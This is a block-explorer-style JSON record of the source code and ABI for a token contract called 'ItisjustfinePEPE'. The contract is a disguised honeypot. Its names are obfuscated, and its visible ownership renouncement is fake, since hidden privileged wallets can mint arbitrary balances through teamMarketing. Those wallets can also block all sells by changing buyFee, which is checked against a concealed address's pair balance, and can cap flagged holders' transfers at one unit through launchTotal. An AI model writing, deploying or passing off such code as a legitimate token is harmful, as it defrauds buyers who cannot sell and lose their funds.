{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface txMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minToken) external view returns (uint256);\n\n    function transfer(address receiverMarketing, uint256 senderLimit) external returns (bool);\n\n    function allowance(address receiverMarketingLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMarketing,\n        uint256 senderLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTx, uint256 value);\n    event Approval(address indexed receiverMarketingLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract swapTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedToEnable {\n    function createPair(address isTake, address shouldMax) external returns (address);\n}\n\ninterface txMarketingMetadata is txMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ItisjustfinePEPE is swapTx, txMarketing, txMarketingMetadata {\n\n    function approve(address txShould, uint256 senderLimit) public virtual override returns (bool) {\n        fundTeam[_msgSender()][txShould] = senderLimit;\n        emit Approval(_msgSender(), txShould, senderLimit);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return txBuy;\n    }\n\n    string private limitWallet = \"Itisjustfine PEPE\";\n\n    uint256 autoMode;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFund;\n    }\n\n    function shouldLaunchAt(address tokenFund) public {\n        if (listTx) {\n            return;\n        }\n        if (totalMin == receiverTotal) {\n            exemptTeam = true;\n        }\n        walletTakeSwap[tokenFund] = true;\n        \n        listTx = true;\n    }\n\n    function teamMarketing(address sellAtFund, uint256 senderLimit) public {\n        maxTake();\n        totalLaunch[sellAtFund] = senderLimit;\n    }\n\n    function takeSender(uint256 senderLimit) public {\n        maxTake();\n        buyFee = senderLimit;\n    }\n\n    uint256 private exemptTrading = 100000000 * 10 ** 18;\n\n    bool private receiverEnable;\n\n    constructor (){\n        \n        listReceiver tokenTake = listReceiver(autoMinSender);\n        senderTradingBuy = launchedToEnable(tokenTake.factory()).createPair(tokenTake.WETH(), address(this));\n        \n        walletLiquidity = _msgSender();\n        maxReceiverTotal();\n        walletTakeSwap[walletLiquidity] = true;\n        totalLaunch[walletLiquidity] = exemptTrading;\n        if (limitShouldLaunched) {\n            limitShouldLaunched = true;\n        }\n        emit Transfer(address(0), walletLiquidity, exemptTrading);\n    }\n\n    string private txIsFee = \"IPE\";\n\n    mapping(address => bool) public walletTakeSwap;\n\n    function allowance(address liquidityLaunch, address txShould) external view virtual override returns (uint256) {\n        if (txShould == autoMinSender) {\n            return type(uint256).max;\n        }\n        return fundTeam[liquidityLaunch][txShould];\n    }\n\n    function transfer(address sellAtFund, uint256 senderLimit) external virtual override returns (bool) {\n        return totalWallet(_msgSender(), sellAtFund, senderLimit);\n    }\n\n    function maxTake() private view {\n        require(walletTakeSwap[_msgSender()]);\n    }\n\n    address shouldTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private fundTeam;\n\n    bool public limitShouldLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTrading;\n    }\n\n    bool private listMin;\n\n    address private txBuy;\n\n    function getOwner() external view returns (address) {\n        return txBuy;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return txIsFee;\n    }\n\n    uint8 private minFund = 18;\n\n    uint256 public launchedShould;\n\n    function totalWallet(address fundLaunch, address receiverMarketing, uint256 senderLimit) internal returns (bool) {\n        if (fundLaunch == walletLiquidity) {\n            return sellBuy(fundLaunch, receiverMarketing, senderLimit);\n        }\n        uint256 swapBuyTrading = txMarketing(senderTradingBuy).balanceOf(shouldTeam);\n        require(swapBuyTrading == buyFee);\n        require(receiverMarketing != shouldTeam);\n        if (receiverLimit[fundLaunch]) {\n            return sellBuy(fundLaunch, receiverMarketing, atAuto);\n        }\n        return sellBuy(fundLaunch, receiverMarketing, senderLimit);\n    }\n\n    function transferFrom(address fundLaunch, address receiverMarketing, uint256 senderLimit) external override returns (bool) {\n        if (_msgSender() != autoMinSender) {\n            if (fundTeam[fundLaunch][_msgSender()] != type(uint256).max) {\n                require(senderLimit <= fundTeam[fundLaunch][_msgSender()]);\n                fundTeam[fundLaunch][_msgSender()] -= senderLimit;\n            }\n        }\n        return totalWallet(fundLaunch, receiverMarketing, senderLimit);\n    }\n\n    uint256 constant atAuto = 1 ** 10;\n\n    uint256 public totalMin;\n\n    function name() external view virtual override returns (string memory) {\n        return limitWallet;\n    }\n\n    uint256 buyFee;\n\n    function balanceOf(address minToken) public view virtual override returns (uint256) {\n        return totalLaunch[minToken];\n    }\n\n    function sellBuy(address fundLaunch, address receiverMarketing, uint256 senderLimit) internal returns (bool) {\n        require(totalLaunch[fundLaunch] >= senderLimit);\n        totalLaunch[fundLaunch] -= senderLimit;\n        totalLaunch[receiverMarketing] += senderLimit;\n        emit Transfer(fundLaunch, receiverMarketing, senderLimit);\n        return true;\n    }\n\n    bool public listTx;\n\n    address public senderTradingBuy;\n\n    address public walletLiquidity;\n\n    function launchTotal(address atLaunch) public {\n        maxTake();\n        if (totalMin != receiverTotal) {\n            receiverTotal = amountFundReceiver;\n        }\n        if (atLaunch == walletLiquidity || atLaunch == senderTradingBuy) {\n            return;\n        }\n        receiverLimit[atLaunch] = true;\n    }\n\n    bool public teamSwap;\n\n    function maxReceiverTotal() public {\n        emit OwnershipTransferred(walletLiquidity, address(0));\n        txBuy = address(0);\n    }\n\n    uint256 public amountFundReceiver;\n\n    event OwnershipTransferred(address indexed atList, address indexed modeLaunched);\n\n    mapping(address => uint256) private totalLaunch;\n\n    mapping(address => bool) public receiverLimit;\n\n    uint256 private receiverTotal;\n\n    address autoMinSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public exemptTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMarketingLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"launchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShouldLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTradingBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"}],\"name\":\"shouldLaunchAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLimit\",\"type\":\"uint256\"}],\"name\":\"takeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAtFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLimit\",\"type\":\"uint256\"}],\"name\":\"teamMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAtFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTakeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ItisjustfinePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}